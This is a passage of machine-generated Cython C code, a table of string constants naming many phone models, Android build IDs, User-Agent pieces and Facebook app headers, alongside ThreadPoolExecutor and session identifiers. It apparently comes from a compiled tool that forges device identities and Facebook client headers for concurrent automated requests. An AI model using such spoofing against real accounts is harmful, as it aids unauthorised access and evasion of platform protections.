    {&__pyx_n_s_Phone, __pyx_k_Phone, sizeof(__pyx_k_Phone), 0, 0, 1, 1},
    {&__pyx_n_s_PhotosAYYUB, __pyx_k_PhotosAYYUB, sizeof(__pyx_k_PhotosAYYUB), 0, 0, 1, 1},
    {&__pyx_n_s_Pixel, __pyx_k_Pixel, sizeof(__pyx_k_Pixel), 0, 0, 1, 1},
    {&__pyx_kp_s_Pixel_3, __pyx_k_Pixel_3, sizeof(__pyx_k_Pixel_3), 0, 0, 1, 0},
    {&__pyx_kp_s_Pixel_XL, __pyx_k_Pixel_XL, sizeof(__pyx_k_Pixel_XL), 0, 0, 1, 0},
    {&__pyx_n_s_Pixi, __pyx_k_Pixi, sizeof(__pyx_k_Pixi), 0, 0, 1, 1},
    {&__pyx_kp_s_Please_Confirm_Email, __pyx_k_Please_Confirm_Email, sizeof(__pyx_k_Please_Confirm_Email), 0, 0, 1, 0},
    {&__pyx_kp_s_Pocophone_F1, __pyx_k_Pocophone_F1, sizeof(__pyx_k_Pocophone_F1), 0, 0, 1, 0},
    {&__pyx_kp_s_Prada_3_0, __pyx_k_Prada_3_0, sizeof(__pyx_k_Prada_3_0), 0, 0, 1, 0},
    {&__pyx_n_s_Pre3, __pyx_k_Pre3, sizeof(__pyx_k_Pre3), 0, 0, 1, 1},
    {&__pyx_kp_s_Primo_GH7, __pyx_k_Primo_GH7, sizeof(__pyx_k_Primo_GH7), 0, 0, 1, 0},
    {&__pyx_kp_u_Profile_MIDP_2_1_Configuration_C, __pyx_k_Profile_MIDP_2_1_Configuration_C, sizeof(__pyx_k_Profile_MIDP_2_1_Configuration_C), 0, 1, 0, 0},
    {&__pyx_kp_s_QKQ1_190910_002, __pyx_k_QKQ1_190910_002, sizeof(__pyx_k_QKQ1_190910_002), 0, 0, 1, 0},
    {&__pyx_kp_s_QP1A_191105_003, __pyx_k_QP1A_191105_003, sizeof(__pyx_k_QP1A_191105_003), 0, 0, 1, 0},
    {&__pyx_kp_s_Qin_1s, __pyx_k_Qin_1s, sizeof(__pyx_k_Qin_1s), 0, 0, 1, 0},
    {&__pyx_kp_s_Qin_2, __pyx_k_Qin_2, sizeof(__pyx_k_Qin_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Qin_2_Pro, __pyx_k_Qin_2_Pro, sizeof(__pyx_k_Qin_2_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Quad_EVO_Energy_5, __pyx_k_Quad_EVO_Energy_5, sizeof(__pyx_k_Quad_EVO_Energy_5), 0, 0, 1, 0},
    {&__pyx_kp_s_Quantum_4, __pyx_k_Quantum_4, sizeof(__pyx_k_Quantum_4), 0, 0, 1, 0},
    {&__pyx_n_s_R, __pyx_k_R, sizeof(__pyx_k_R), 0, 0, 1, 1},
    {&__pyx_kp_s_RD1A_201105_003_C1, __pyx_k_RD1A_201105_003_C1, sizeof(__pyx_k_RD1A_201105_003_C1), 0, 0, 1, 0},
    {&__pyx_n_s_RMX2085, __pyx_k_RMX2085, sizeof(__pyx_k_RMX2085), 0, 0, 1, 1},
    {&__pyx_n_s_RMX2185, __pyx_k_RMX2185, sizeof(__pyx_k_RMX2185), 0, 0, 1, 1},
    {&__pyx_kp_s_RM_560, __pyx_k_RM_560, sizeof(__pyx_k_RM_560), 0, 0, 1, 0},
    {&__pyx_kp_s_RP1A_201005_004_A1, __pyx_k_RP1A_201005_004_A1, sizeof(__pyx_k_RP1A_201005_004_A1), 0, 0, 1, 0},
    {&__pyx_kp_s_Radar_4G, __pyx_k_Radar_4G, sizeof(__pyx_k_Radar_4G), 0, 0, 1, 0},
    {&__pyx_kp_s_Radar_C110e, __pyx_k_Radar_C110e, sizeof(__pyx_k_Radar_C110e), 0, 0, 1, 0},
    {&__pyx_n_s_Random, __pyx_k_Random, sizeof(__pyx_k_Random), 0, 0, 1, 1},
    {&__pyx_n_s_Realme, __pyx_k_Realme, sizeof(__pyx_k_Realme), 0, 0, 1, 1},
    {&__pyx_kp_s_Realme_2, __pyx_k_Realme_2, sizeof(__pyx_k_Realme_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Red_Rice, __pyx_k_Red_Rice, sizeof(__pyx_k_Red_Rice), 0, 0, 1, 0},
    {&__pyx_kp_u_Redmi, __pyx_k_Redmi, sizeof(__pyx_k_Redmi), 0, 1, 0, 0},
    {&__pyx_kp_s_Redmi_11, __pyx_k_Redmi_11, sizeof(__pyx_k_Redmi_11), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_12, __pyx_k_Redmi_12, sizeof(__pyx_k_Redmi_12), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_2, __pyx_k_Redmi_2, sizeof(__pyx_k_Redmi_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_3, __pyx_k_Redmi_3, sizeof(__pyx_k_Redmi_3), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_3S, __pyx_k_Redmi_3S, sizeof(__pyx_k_Redmi_3S), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_4, __pyx_k_Redmi_4, sizeof(__pyx_k_Redmi_4), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_4A, __pyx_k_Redmi_4A, sizeof(__pyx_k_Redmi_4A), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_4X, __pyx_k_Redmi_4X, sizeof(__pyx_k_Redmi_4X), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_5, __pyx_k_Redmi_5, sizeof(__pyx_k_Redmi_5), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_5A, __pyx_k_Redmi_5A, sizeof(__pyx_k_Redmi_5A), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_5_Plus, __pyx_k_Redmi_5_Plus, sizeof(__pyx_k_Redmi_5_Plus), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_6, __pyx_k_Redmi_6, sizeof(__pyx_k_Redmi_6), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_7, __pyx_k_Redmi_7, sizeof(__pyx_k_Redmi_7), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_8, __pyx_k_Redmi_8, sizeof(__pyx_k_Redmi_8), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_9, __pyx_k_Redmi_9, sizeof(__pyx_k_Redmi_9), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_A1, __pyx_k_Redmi_A1, sizeof(__pyx_k_Redmi_A1), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_A2, __pyx_k_Redmi_A2, sizeof(__pyx_k_Redmi_A2), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_A3, __pyx_k_Redmi_A3, sizeof(__pyx_k_Redmi_A3), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_K30, __pyx_k_Redmi_K30, sizeof(__pyx_k_Redmi_K30), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_K40, __pyx_k_Redmi_K40, sizeof(__pyx_k_Redmi_K40), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_K50, __pyx_k_Redmi_K50, sizeof(__pyx_k_Redmi_K50), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_K60, __pyx_k_Redmi_K60, sizeof(__pyx_k_Redmi_K60), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note, __pyx_k_Redmi_Note, sizeof(__pyx_k_Redmi_Note), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note10, __pyx_k_Redmi_Note10, sizeof(__pyx_k_Redmi_Note10), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note10T, __pyx_k_Redmi_Note10T, sizeof(__pyx_k_Redmi_Note10T), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note7, __pyx_k_Redmi_Note7, sizeof(__pyx_k_Redmi_Note7), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note8, __pyx_k_Redmi_Note8, sizeof(__pyx_k_Redmi_Note8), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note8T, __pyx_k_Redmi_Note8T, sizeof(__pyx_k_Redmi_Note8T), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note9, __pyx_k_Redmi_Note9, sizeof(__pyx_k_Redmi_Note9), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_1, __pyx_k_Redmi_Note_1, sizeof(__pyx_k_Redmi_Note_1), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_10Redmi_Note_11, __pyx_k_Redmi_Note_10Redmi_Note_11, sizeof(__pyx_k_Redmi_Note_10Redmi_Note_11), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_12, __pyx_k_Redmi_Note_12, sizeof(__pyx_k_Redmi_Note_12), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_12T, __pyx_k_Redmi_Note_12T, sizeof(__pyx_k_Redmi_Note_12T), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_13, __pyx_k_Redmi_Note_13, sizeof(__pyx_k_Redmi_Note_13), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_15_Pro, __pyx_k_Redmi_Note_15_Pro, sizeof(__pyx_k_Redmi_Note_15_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_2, __pyx_k_Redmi_Note_2, sizeof(__pyx_k_Redmi_Note_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_3, __pyx_k_Redmi_Note_3, sizeof(__pyx_k_Redmi_Note_3), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_4, __pyx_k_Redmi_Note_4, sizeof(__pyx_k_Redmi_Note_4), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_4X, __pyx_k_Redmi_Note_4X, sizeof(__pyx_k_Redmi_Note_4X), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_5, __pyx_k_Redmi_Note_5, sizeof(__pyx_k_Redmi_Note_5), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_5A, __pyx_k_Redmi_Note_5A, sizeof(__pyx_k_Redmi_Note_5A), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_5A_Prime, __pyx_k_Redmi_Note_5A_Prime, sizeof(__pyx_k_Redmi_Note_5A_Prime), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_5_Pro, __pyx_k_Redmi_Note_5_Pro, sizeof(__pyx_k_Redmi_Note_5_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_6, __pyx_k_Redmi_Note_6, sizeof(__pyx_k_Redmi_Note_6), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_7, __pyx_k_Redmi_Note_7, sizeof(__pyx_k_Redmi_Note_7), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_7_Pro, __pyx_k_Redmi_Note_7_Pro, sizeof(__pyx_k_Redmi_Note_7_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_8T, __pyx_k_Redmi_Note_8T, sizeof(__pyx_k_Redmi_Note_8T), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_8_Pro, __pyx_k_Redmi_Note_8_Pro, sizeof(__pyx_k_Redmi_Note_8_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_9, __pyx_k_Redmi_Note_9, sizeof(__pyx_k_Redmi_Note_9), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_9S, __pyx_k_Redmi_Note_9S, sizeof(__pyx_k_Redmi_Note_9S), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_9T, __pyx_k_Redmi_Note_9T, sizeof(__pyx_k_Redmi_Note_9T), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_9T_5G, __pyx_k_Redmi_Note_9T_5G, sizeof(__pyx_k_Redmi_Note_9T_5G), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_9_5G, __pyx_k_Redmi_Note_9_5G, sizeof(__pyx_k_Redmi_Note_9_5G), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_9_Pro, __pyx_k_Redmi_Note_9_Pro, sizeof(__pyx_k_Redmi_Note_9_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_9_Pro_5G, __pyx_k_Redmi_Note_9_Pro_5G, sizeof(__pyx_k_Redmi_Note_9_Pro_5G), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_9_Pro_Max, __pyx_k_Redmi_Note_9_Pro_Max, sizeof(__pyx_k_Redmi_Note_9_Pro_Max), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Note_Prime, __pyx_k_Redmi_Note_Prime, sizeof(__pyx_k_Redmi_Note_Prime), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Pad, __pyx_k_Redmi_Pad, sizeof(__pyx_k_Redmi_Pad), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Pro, __pyx_k_Redmi_Pro, sizeof(__pyx_k_Redmi_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_S2, __pyx_k_Redmi_S2, sizeof(__pyx_k_Redmi_S2), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_X, __pyx_k_Redmi_X, sizeof(__pyx_k_Redmi_X), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Y1, __pyx_k_Redmi_Y1, sizeof(__pyx_k_Redmi_Y1), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Y1_Lite, __pyx_k_Redmi_Y1_Lite, sizeof(__pyx_k_Redmi_Y1_Lite), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Y2, __pyx_k_Redmi_Y2, sizeof(__pyx_k_Redmi_Y2), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_Y3, __pyx_k_Redmi_Y3, sizeof(__pyx_k_Redmi_Y3), 0, 0, 1, 0},
    {&__pyx_kp_s_Redmi_note, __pyx_k_Redmi_note, sizeof(__pyx_k_Redmi_note), 0, 0, 1, 0},
    {&__pyx_kp_s_Rex_60, __pyx_k_Rex_60, sizeof(__pyx_k_Rex_60), 0, 0, 1, 0},
    {&__pyx_kp_s_Rex_80, __pyx_k_Rex_80, sizeof(__pyx_k_Rex_80), 0, 0, 1, 0},
    {&__pyx_n_s_Rhyme, __pyx_k_Rhyme, sizeof(__pyx_k_Rhyme), 0, 0, 1, 1},
    {&__pyx_n_s_Ruby, __pyx_k_Ruby, sizeof(__pyx_k_Ruby), 0, 0, 1, 1},
    {&__pyx_n_s_S, __pyx_k_S, sizeof(__pyx_k_S), 0, 0, 1, 1},
    {&__pyx_n_s_S4502M, __pyx_k_S4502M, sizeof(__pyx_k_S4502M), 0, 0, 1, 1},
    {&__pyx_n_s_S4505M, __pyx_k_S4505M, sizeof(__pyx_k_S4505M), 0, 0, 1, 1},
    {&__pyx_n_s_S4702M, __pyx_k_S4702M, sizeof(__pyx_k_S4702M), 0, 0, 1, 1},
    {&__pyx_n_s_S580, __pyx_k_S580, sizeof(__pyx_k_S580), 0, 0, 1, 1},
    {&__pyx_n_s_S616, __pyx_k_S616, sizeof(__pyx_k_S616), 0, 0, 1, 1},
    {&__pyx_n_s_S660, __pyx_k_S660, sizeof(__pyx_k_S660), 0, 0, 1, 1},
    {&__pyx_kp_s_SA_str_rr_1_9_Mobile_Safari_str, __pyx_k_SA_str_rr_1_9_Mobile_Safari_str, sizeof(__pyx_k_SA_str_rr_1_9_Mobile_Safari_str), 0, 0, 1, 0},
    {&__pyx_kp_s_SD1A_210817_037_A1, __pyx_k_SD1A_210817_037_A1, sizeof(__pyx_k_SD1A_210817_037_A1), 0, 0, 1, 0},
    {&__pyx_kp_s_SGH_E250, __pyx_k_SGH_E250, sizeof(__pyx_k_SGH_E250), 0, 0, 1, 0},
    {&__pyx_kp_s_SGH_I547, __pyx_k_SGH_I547, sizeof(__pyx_k_SGH_I547), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_A500F, __pyx_k_SM_A500F, sizeof(__pyx_k_SM_A500F), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_A500FU, __pyx_k_SM_A500FU, sizeof(__pyx_k_SM_A500FU), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_A500H, __pyx_k_SM_A500H, sizeof(__pyx_k_SM_A500H), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G485F, __pyx_k_SM_G485F, sizeof(__pyx_k_SM_G485F), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G900F, __pyx_k_SM_G900F, sizeof(__pyx_k_SM_G900F), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G920F, __pyx_k_SM_G920F, sizeof(__pyx_k_SM_G920F), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G930F, __pyx_k_SM_G930F, sizeof(__pyx_k_SM_G930F), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G935F, __pyx_k_SM_G935F, sizeof(__pyx_k_SM_G935F), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_G950F, __pyx_k_SM_G950F, sizeof(__pyx_k_SM_G950F), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J320F, __pyx_k_SM_J320F, sizeof(__pyx_k_SM_J320F), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J320FN, __pyx_k_SM_J320FN, sizeof(__pyx_k_SM_J320FN), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J320H, __pyx_k_SM_J320H, sizeof(__pyx_k_SM_J320H), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J320M, __pyx_k_SM_J320M, sizeof(__pyx_k_SM_J320M), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J510FN, __pyx_k_SM_J510FN, sizeof(__pyx_k_SM_J510FN), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_J701F, __pyx_k_SM_J701F, sizeof(__pyx_k_SM_J701F), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T111, __pyx_k_SM_T111, sizeof(__pyx_k_SM_T111), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T230, __pyx_k_SM_T230, sizeof(__pyx_k_SM_T230), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T231, __pyx_k_SM_T231, sizeof(__pyx_k_SM_T231), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T235, __pyx_k_SM_T235, sizeof(__pyx_k_SM_T235), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T310, __pyx_k_SM_T310, sizeof(__pyx_k_SM_T310), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T311, __pyx_k_SM_T311, sizeof(__pyx_k_SM_T311), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T315, __pyx_k_SM_T315, sizeof(__pyx_k_SM_T315), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T525, __pyx_k_SM_T525, sizeof(__pyx_k_SM_T525), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T531, __pyx_k_SM_T531, sizeof(__pyx_k_SM_T531), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T535, __pyx_k_SM_T535, sizeof(__pyx_k_SM_T535), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T555, __pyx_k_SM_T555, sizeof(__pyx_k_SM_T555), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T561, __pyx_k_SM_T561, sizeof(__pyx_k_SM_T561), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T705, __pyx_k_SM_T705, sizeof(__pyx_k_SM_T705), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T805, __pyx_k_SM_T805, sizeof(__pyx_k_SM_T805), 0, 0, 1, 0},
    {&__pyx_kp_s_SM_T820, __pyx_k_SM_T820, sizeof(__pyx_k_SM_T820), 0, 0, 1, 0},
    {&__pyx_kp_s_SPH_L720, __pyx_k_SPH_L720, sizeof(__pyx_k_SPH_L720), 0, 0, 1, 0},
    {&__pyx_kp_s_SQ1A_211205_008, __pyx_k_SQ1A_211205_008, sizeof(__pyx_k_SQ1A_211205_008), 0, 0, 1, 0},
    {&__pyx_kp_u_Safari, __pyx_k_Safari, sizeof(__pyx_k_Safari), 0, 1, 0, 0},
    {&__pyx_kp_u_Safari_537_36_Edg, __pyx_k_Safari_537_36_Edg, sizeof(__pyx_k_Safari_537_36_Edg), 0, 1, 0, 0},
    {&__pyx_n_s_Sensation, __pyx_k_Sensation, sizeof(__pyx_k_Sensation), 0, 0, 1, 1},
    {&__pyx_n_s_September, __pyx_k_September, sizeof(__pyx_k_September), 0, 0, 1, 1},
    {&__pyx_n_s_Session, __pyx_k_Session, sizeof(__pyx_k_Session), 0, 0, 1, 1},
    {&__pyx_n_s_Spark, __pyx_k_Spark, sizeof(__pyx_k_Spark), 0, 0, 1, 1},
    {&__pyx_kp_s_Star_3_Duos, __pyx_k_Star_3_Duos, sizeof(__pyx_k_Star_3_Duos), 0, 0, 1, 0},
    {&__pyx_kp_s_Storm_9530, __pyx_k_Storm_9530, sizeof(__pyx_k_Storm_9530), 0, 0, 1, 0},
    {&__pyx_n_s_Stream, __pyx_k_Stream, sizeof(__pyx_k_Stream), 0, 0, 1, 1},
    {&__pyx_kp_s_Stylo_2_Plus_T_Mobile, __pyx_k_Stylo_2_Plus_T_Mobile, sizeof(__pyx_k_Stylo_2_Plus_T_Mobile), 0, 0, 1, 0},
    {&__pyx_kp_s_Stylus_2, __pyx_k_Stylus_2, sizeof(__pyx_k_Stylus_2), 0, 0, 1, 0},
    {&__pyx_n_s_T500XXU3BUA8, __pyx_k_T500XXU3BUA8, sizeof(__pyx_k_T500XXU3BUA8), 0, 0, 1, 1},
    {&__pyx_n_s_T970XXU3BUI7, __pyx_k_T970XXU3BUI7, sizeof(__pyx_k_T970XXU3BUI7), 0, 0, 1, 1},
    {&__pyx_kp_s_TM_4377, __pyx_k_TM_4377, sizeof(__pyx_k_TM_4377), 0, 0, 1, 0},
    {&__pyx_kp_s_TQ1A_230105_001_A3, __pyx_k_TQ1A_230105_001_A3, sizeof(__pyx_k_TQ1A_230105_001_A3), 0, 0, 1, 0},
    {&__pyx_n_s_ThreadPoolExecutor, __pyx_k_ThreadPoolExecutor, sizeof(__pyx_k_ThreadPoolExecutor), 0, 0, 1, 1},
    {&__pyx_kp_s_Torch_4G_9810, __pyx_k_Torch_4G_9810, sizeof(__pyx_k_Torch_4G_9810), 0, 0, 1, 0},
    {&__pyx_kp_s_User_Agent, __pyx_k_User_Agent, sizeof(__pyx_k_User_Agent), 0, 0, 1, 0},
    {&__pyx_kp_s_V10_AT_T, __pyx_k_V10_AT_T, sizeof(__pyx_k_V10_AT_T), 0, 0, 1, 0},
    {&__pyx_kp_s_V10_T_Mobile, __pyx_k_V10_T_Mobile, sizeof(__pyx_k_V10_T_Mobile), 0, 0, 1, 0},
    {&__pyx_kp_s_V10_Verizon, __pyx_k_V10_Verizon, sizeof(__pyx_k_V10_Verizon), 0, 0, 1, 0},
    {&__pyx_n_s_V1Max, __pyx_k_V1Max, sizeof(__pyx_k_V1Max), 0, 0, 1, 1},
    {&__pyx_n_s_V20, __pyx_k_V20, sizeof(__pyx_k_V20), 0, 0, 1, 1},
    {&__pyx_kp_s_V20_AT_T, __pyx_k_V20_AT_T, sizeof(__pyx_k_V20_AT_T), 0, 0, 1, 0},
    {&__pyx_kp_s_V20_Sprint, __pyx_k_V20_Sprint, sizeof(__pyx_k_V20_Sprint), 0, 0, 1, 0},
    {&__pyx_kp_s_V20_T_Mobile, __pyx_k_V20_T_Mobile, sizeof(__pyx_k_V20_T_Mobile), 0, 0, 1, 0},
    {&__pyx_kp_s_V20_Verizon, __pyx_k_V20_Verizon, sizeof(__pyx_k_V20_Verizon), 0, 0, 1, 0},
    {&__pyx_n_s_V3, __pyx_k_V3, sizeof(__pyx_k_V3), 0, 0, 1, 1},
    {&__pyx_n_s_V5, __pyx_k_V5, sizeof(__pyx_k_V5), 0, 0, 1, 1},
    {&__pyx_n_s_V5s, __pyx_k_V5s, sizeof(__pyx_k_V5s), 0, 0, 1, 1},
    {&__pyx_n_s_V7, __pyx_k_V7, sizeof(__pyx_k_V7), 0, 0, 1, 1},
    {&__pyx_kp_s_V7_Plus, __pyx_k_V7_Plus, sizeof(__pyx_k_V7_Plus), 0, 0, 1, 0},
    {&__pyx_n_s_V808, __pyx_k_V808, sizeof(__pyx_k_V808), 0, 0, 1, 1},
    {&__pyx_n_s_V9, __pyx_k_V9, sizeof(__pyx_k_V9), 0, 0, 1, 1},
    {&__pyx_kp_s_VR_Bot_552, __pyx_k_VR_Bot_552, sizeof(__pyx_k_VR_Bot_552), 0, 0, 1, 0},
    {&__pyx_n_s_VX5500, __pyx_k_VX5500, sizeof(__pyx_k_VX5500), 0, 0, 1, 1},
    {&__pyx_n_s_Valencia, __pyx_k_Valencia, sizeof(__pyx_k_Valencia), 0, 0, 1, 1},
    {&__pyx_n_s_ValueError, __pyx_k_ValueError, sizeof(__pyx_k_ValueError), 0, 0, 1, 1},
    {&__pyx_kp_s_Vdeo_2, __pyx_k_Vdeo_2, sizeof(__pyx_k_Vdeo_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Vega_Iron_2_WiFi, __pyx_k_Vega_Iron_2_WiFi, sizeof(__pyx_k_Vega_Iron_2_WiFi), 0, 0, 1, 0},
    {&__pyx_kp_s_Vibe_K5, __pyx_k_Vibe_K5, sizeof(__pyx_k_Vibe_K5), 0, 0, 1, 0},
    {&__pyx_kp_s_Vibe_K5_Note, __pyx_k_Vibe_K5_Note, sizeof(__pyx_k_Vibe_K5_Note), 0, 0, 1, 0},
    {&__pyx_kp_s_Vibe_K5_Plus_Dual_SIM, __pyx_k_Vibe_K5_Plus_Dual_SIM, sizeof(__pyx_k_Vibe_K5_Plus_Dual_SIM), 0, 0, 1, 0},
    {&__pyx_kp_s_Vibe_X, __pyx_k_Vibe_X, sizeof(__pyx_k_Vibe_X), 0, 0, 1, 0},
    {&__pyx_kp_s_Vibe_Z, __pyx_k_Vibe_Z, sizeof(__pyx_k_Vibe_Z), 0, 0, 1, 0},
    {&__pyx_n_s_Vision, __pyx_k_Vision, sizeof(__pyx_k_Vision), 0, 0, 1, 1},
    {&__pyx_kp_s_Vision_3_Dual_SIM, __pyx_k_Vision_3_Dual_SIM, sizeof(__pyx_k_Vision_3_Dual_SIM), 0, 0, 1, 0},
    {&__pyx_kp_s_Volt_LS740, __pyx_k_Volt_LS740, sizeof(__pyx_k_Volt_LS740), 0, 0, 1, 0},
    {&__pyx_kp_u_WOW64_AppleWebKit, __pyx_k_WOW64_AppleWebKit, sizeof(__pyx_k_WOW64_AppleWebKit), 0, 1, 0, 0},
    {&__pyx_n_s_X, __pyx_k_X, sizeof(__pyx_k_X), 0, 0, 1, 1},
    {&__pyx_n_s_X1, __pyx_k_X1, sizeof(__pyx_k_X1), 0, 0, 1, 1},
    {&__pyx_n_s_X2, __pyx_k_X2, sizeof(__pyx_k_X2), 0, 0, 1, 1},
    {&__pyx_n_s_X3, __pyx_k_X3, sizeof(__pyx_k_X3), 0, 0, 1, 1},
    {&__pyx_n_s_X4, __pyx_k_X4, sizeof(__pyx_k_X4), 0, 0, 1, 1},
    {&__pyx_n_s_X5, __pyx_k_X5, sizeof(__pyx_k_X5), 0, 0, 1, 1},
    {&__pyx_kp_s_XD, __pyx_k_XD, sizeof(__pyx_k_XD), 0, 0, 1, 0},
    {&__pyx_kp_s_XD_2, __pyx_k_XD_2, sizeof(__pyx_k_XD_2), 0, 0, 1, 0},
    {&__pyx_kp_u_XD_3, __pyx_k_XD_3, sizeof(__pyx_k_XD_3), 0, 1, 0, 0},
    {&__pyx_kp_s_X_FB_Connection_Bandwidth, __pyx_k_X_FB_Connection_Bandwidth, sizeof(__pyx_k_X_FB_Connection_Bandwidth), 0, 0, 1, 0},
    {&__pyx_kp_s_X_FB_Connection_Type, __pyx_k_X_FB_Connection_Type, sizeof(__pyx_k_X_FB_Connection_Type), 0, 0, 1, 0},
    {&__pyx_kp_s_X_FB_Friendly_Name, __pyx_k_X_FB_Friendly_Name, sizeof(__pyx_k_X_FB_Friendly_Name), 0, 0, 1, 0},
    {&__pyx_kp_s_X_FB_HTTP_Engine, __pyx_k_X_FB_HTTP_Engine, sizeof(__pyx_k_X_FB_HTTP_Engine), 0, 0, 1, 0},
    {&__pyx_kp_s_X_FB_Net_HNI, __pyx_k_X_FB_Net_HNI, sizeof(__pyx_k_X_FB_Net_HNI), 0, 0, 1, 0},
    {&__pyx_kp_s_X_FB_SIM_HNI, __pyx_k_X_FB_SIM_HNI, sizeof(__pyx_k_X_FB_SIM_HNI), 0, 0, 1, 0},
    {&__pyx_n_s_Y, __pyx_k_Y, sizeof(__pyx_k_Y), 0, 0, 1, 1},
    {&__pyx_n_s_Y21, __pyx_k_Y21, sizeof(__pyx_k_Y21), 0, 0, 1, 1},
    {&__pyx_n_s_Y21L, __pyx_k_Y21L, sizeof(__pyx_k_Y21L), 0, 0, 1, 1},
    {&__pyx_n_s_Y28, __pyx_k_Y28, sizeof(__pyx_k_Y28), 0, 0, 1, 1},
    {&__pyx_kp_s_Y336_U02, __pyx_k_Y336_U02, sizeof(__pyx_k_Y336_U02), 0, 0, 1, 0},
    {&__pyx_kp_s_Y3_2018, __pyx_k_Y3_2018, sizeof(__pyx_k_Y3_2018), 0, 0, 1, 0},
    {&__pyx_n_s_Y51, __pyx_k_Y51, sizeof(__pyx_k_Y51), 0, 0, 1, 1},
    {&__pyx_n_s_Y51L, __pyx_k_Y51L, sizeof(__pyx_k_Y51L), 0, 0, 1, 1},
